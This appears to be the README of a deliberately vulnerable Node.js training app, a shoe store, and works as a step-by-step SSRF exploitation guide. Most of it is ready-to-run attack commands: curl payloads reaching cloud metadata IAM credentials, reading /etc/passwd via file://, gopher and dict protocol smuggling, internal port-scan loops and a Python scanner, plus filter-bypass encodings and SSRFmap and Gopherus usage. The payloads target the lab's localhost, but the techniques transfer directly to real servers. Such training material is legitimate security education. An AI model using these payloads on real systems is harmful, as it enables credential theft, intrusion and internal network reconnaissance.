# Mr. Bluejays Vulnerable Shoe Store - SSRF Exploitation Guide

## 🚨 Security Training Application
**This application contains intentional SSRF vulnerabilities for security education and demonstration purposes.**

---

## Quick Start

### 1. Installation
```bash
# Install dependencies
npm install

# Start the vulnerable server
npm start

# Server will run on http://localhost:3000
```

### 2. Access the Application
- Open `index.html` in your browser
- Or navigate to `http://localhost:3000`

---

## 🎯 SSRF Exploitation Guide

### What is SSRF?
Server-Side Request Forgery (SSRF) allows attackers to make the server perform HTTP requests to arbitrary destinations, potentially accessing internal resources that are not directly accessible from the internet.

---

## 📍 Vulnerable Endpoints & Exploitation

### 1. Product Image Loader
**Endpoint:** `GET /api/product-image?url=<TARGET_URL>`

**Frontend Access:**
1. Navigate to the **BOOTS** page
2. Scroll down to "Load Custom Product Image" section
3. Enter malicious URL
4. Click "Load Image"

**Direct Exploitation:**
```bash
# Access internal admin panel
curl "http://localhost:3000/api/product-image?url=http://localhost:3000/admin/users"

# Access AWS metadata (if on EC2)
curl "http://localhost:3000/api/product-image?url=http://169.254.169.254/latest/meta-data/"

# Scan internal network
curl "http://localhost:3000/api/product-image?url=http://192.168.1.1:80/"
```

---

### 2. URL Preview Feature
**Endpoint:** `POST /api/preview-url`

**Frontend Access:**
1. Navigate to the **ABOUT** page
2. Scroll down to "Preview External Catalog" section
3. Enter target URL
4. Click "Preview"

**Direct Exploitation:**
```bash
# Fetch internal configuration
curl -X POST http://localhost:3000/api/preview-url \
  -H "Content-Type: application/json" \
  -d '{"targetUrl":"http://localhost:3000/internal/config"}'

# Access internal services
curl -X POST http://localhost:3000/api/preview-url \
  -H "Content-Type: application/json" \
  -d '{"targetUrl":"http://localhost:9200/_cat/indices"}' # Elasticsearch

# Read local files (some configurations)
curl -X POST http://localhost:3000/api/preview-url \
  -H "Content-Type: application/json" \
  -d '{"targetUrl":"file:///etc/passwd"}'
```

---

### 3. Product Import
**Endpoint:** `POST /api/import-product`

**Direct Exploitation Only:**
```bash
# Import from internal endpoint
curl -X POST http://localhost:3000/api/import-product \
  -H "Content-Type: application/json" \
  -d '{"catalogUrl":"http://localhost:3000/admin/users"}'

# Access Redis (if running)
curl -X POST http://localhost:3000/api/import-product \
  -H "Content-Type: application/json" \
  -d '{"catalogUrl":"http://localhost:6379/"}'
```

---

## 🔥 Exploitation Scenarios

### Scenario 1: Access Internal Admin Panel
```bash
# Step 1: Discover internal endpoints
curl "http://localhost:3000/api/product-image?url=http://localhost:3000/admin/users"

# Step 2: Extract sensitive data
curl "http://localhost:3000/api/product-image?url=http://localhost:3000/internal/config"
```

**Expected Result:** Exposes internal user data and API keys

---

### Scenario 2: Cloud Metadata Exploitation (AWS)
```bash
# Get instance metadata
curl "http://localhost:3000/api/product-image?url=http://169.254.169.254/latest/meta-data/"

# Get IAM role name
curl "http://localhost:3000/api/product-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Get temporary credentials
curl "http://localhost:3000/api/product-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]"
```

**Expected Result:** AWS credentials and instance information

---

### Scenario 3: Internal Network Discovery
```bash
# Scan common internal IPs
for i in {1..255}; do
  curl "http://localhost:3000/api/product-image?url=http://192.168.1.$i:80/" \
    -w "\n192.168.1.$i: %{http_code}\n" -s -o /dev/null
done

# Check for common services
curl -X POST http://localhost:3000/api/preview-url \
  -H "Content-Type: application/json" \
  -d '{"targetUrl":"http://localhost:3306"}' # MySQL

curl -X POST http://localhost:3000/api/preview-url \
  -H "Content-Type: application/json" \
  -d '{"targetUrl":"http://localhost:27017"}' # MongoDB

curl -X POST http://localhost:3000/api/preview-url \
  -H "Content-Type: application/json" \
  -d '{"targetUrl":"http://localhost:9200"}' # Elasticsearch
```

---

### Scenario 4: Bypass WAF/Firewall
```bash
# Use different protocols
curl -X POST http://localhost:3000/api/preview-url \
  -H "Content-Type: application/json" \
  -d '{"targetUrl":"gopher://localhost:3306"}'

# URL encoding bypass
curl "http://localhost:3000/api/product-image?url=http%3A%2F%2F127%2E0%2E0%2E1%3A3000%2Fadmin%2Fusers"

# DNS rebinding
curl -X POST http://localhost:3000/api/preview-url \
  -H "Content-Type: application/json" \
  -d '{"targetUrl":"http://nip.io/admin"}'
```

---

## 💣 Advanced Exploitation Techniques

### 1. Blind SSRF Detection
When the response doesn't return content, use timing or external interactions:

```bash
# Use Burp Collaborator or similar
curl -X POST http://localhost:3000/api/preview-url \
  -H "Content-Type: application/json" \
  -d '{"targetUrl":"http://your-collaborator-url.burpcollaborator.net"}'

# Time-based detection
time curl "http://localhost:3000/api/product-image?url=http://non-existent-domain-12345.com"
```

### 2. Protocol Smuggling
```bash
# Try different protocols
curl -X POST http://localhost:3000/api/preview-url \
  -H "Content-Type: application/json" \
  -d '{"targetUrl":"dict://localhost:11211/stats"}' # Memcached

curl -X POST http://localhost:3000/api/preview-url \
  -H "Content-Type: application/json" \
  -d '{"targetUrl":"ftp://localhost:21"}'
```

### 3. Port Scanning Script
```python
#!/usr/bin/env python3
import requests
import json

target = "http://localhost:3000/api/preview-url"
ports = [21, 22, 23, 25, 80, 443, 3306, 3389, 5432, 6379, 8080, 9200, 27017]

for port in ports:
    url = f"http://localhost:{port}"
    try:
        r = requests.post(target,
                         json={"targetUrl": url},
                         timeout=5)
        if r.status_code == 200:
            print(f"[+] Port {port} is open")
        else:
            print(f"[-] Port {port} returned {r.status_code}")
    except:
        print(f"[-] Port {port} timeout/error")
```

---

## 🛡️ Impact Demonstration

### Data Exfiltration Example
```bash
# Step 1: Find internal API
curl -X POST http://localhost:3000/api/preview-url \
  -H "Content-Type: application/json" \
  -d '{"targetUrl":"http://localhost:3000/internal/config"}'

# Response will contain:
# - Database credentials
# - API keys
# - Internal service endpoints
```

### Service Discovery Example
```bash
# Discover running services
for port in 80 443 3000 3306 5432 6379 8080 9200 27017; do
  echo "Checking port $port..."
  curl -s -X POST http://localhost:3000/api/preview-url \
    -H "Content-Type: application/json" \
    -d "{\"targetUrl\":\"http://localhost:$port\"}" \
    -o /dev/null -w "Port $port: %{http_code}\n"
done
```

---

## 📊 Exploitation Checklist

- [ ] **Internal Endpoints**
  - [ ] `/admin/users` - User data
  - [ ] `/internal/config` - Configuration & API keys
  - [ ] `/health` - Service information

- [ ] **Cloud Metadata**
  - [ ] AWS: `169.254.169.254`
  - [ ] Azure: `169.254.169.254`
  - [ ] GCP: `metadata.google.internal`
  - [ ] DigitalOcean: `169.254.169.254`

- [ ] **Internal Services**
  - [ ] MySQL: `localhost:3306`
  - [ ] PostgreSQL: `localhost:5432`
  - [ ] MongoDB: `localhost:27017`
  - [ ] Redis: `localhost:6379`
  - [ ] Elasticsearch: `localhost:9200`
  - [ ] Memcached: `localhost:11211`

- [ ] **Network Ranges**
  - [ ] `127.0.0.1` - Loopback
  - [ ] `10.0.0.0/8` - Private network
  - [ ] `172.16.0.0/12` - Private network
  - [ ] `192.168.0.0/16` - Private network
  - [ ] `fc00::/7` - IPv6 private

---

## 🔍 Detection Evasion

### Bypass Techniques
```bash
# IPv6 localhost
curl "http://localhost:3000/api/product-image?url=http://[::1]:3000/admin/users"

# Decimal IP
curl "http://localhost:3000/api/product-image?url=http://2130706433:3000/admin/users"

# Hex encoding
curl "http://localhost:3000/api/product-image?url=http://0x7f.0x0.0x0.0x1:3000/admin/users"

# URL shorteners (create shortened URL pointing to internal resource)
curl "http://localhost:3000/api/product-image?url=http://bit.ly/[shortened-internal-url]"

# DNS tricks
curl "http://localhost:3000/api/product-image?url=http://localhost.mydomain.com:3000/admin/users"
```

---

## 🚀 Automated Exploitation

### Burp Suite Configuration
1. Set target to `http://localhost:3000`
2. Use Intruder on `/api/product-image?url=§payload§`
3. Load payload list with internal IPs/ports
4. Monitor responses for different status codes/sizes

### SSRF Exploitation Tools
```bash
# SSRFmap
python3 SSRFmap.py -r request.txt -p url -m readfiles

# Gopherus (for generating gopher payloads)
python3 gopherus.py --exploit mysql

# See-SURF (SSRF scanner)
python3 see-surf.py -t http://localhost:3000
```

---

## 📈 Success Indicators

### You've Successfully Exploited SSRF When:
1. ✅ Retrieved internal user data from `/admin/users`
2. ✅ Accessed configuration with API keys from `/internal/config`
3. ✅ Discovered internal services on different ports
4. ✅ Retrieved cloud metadata (if applicable)
5. ✅ Mapped internal network structure
6. ✅ Accessed services not exposed to internet

---

## 🎓 Learning Objectives

After exploiting this application, you should understand:
- How SSRF vulnerabilities work
- Impact of unrestricted URL fetching
- Techniques for discovering internal resources
- Methods to bypass basic filters
- Importance of input validation
- Network segmentation principles

---

## ⚠️ Ethical Use Only

This application is for:
- Security education and training
- Penetration testing practice
- Security awareness demonstrations
- Vulnerability research
- CTF preparation

**Never attempt these techniques on systems you don't own or have explicit permission to test.**

---

## 📚 Additional Resources

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
- [HackTricks SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

## 🔧 Troubleshooting

If exploitation isn't working:
1. Ensure server is running (`npm start`)
2. Check server console for request logs
3. Try different URL encodings
4. Verify target service is accessible
5. Check firewall rules
6. Review error messages in responses

---

**Happy Learning! Remember: Use Responsibly! 🔒**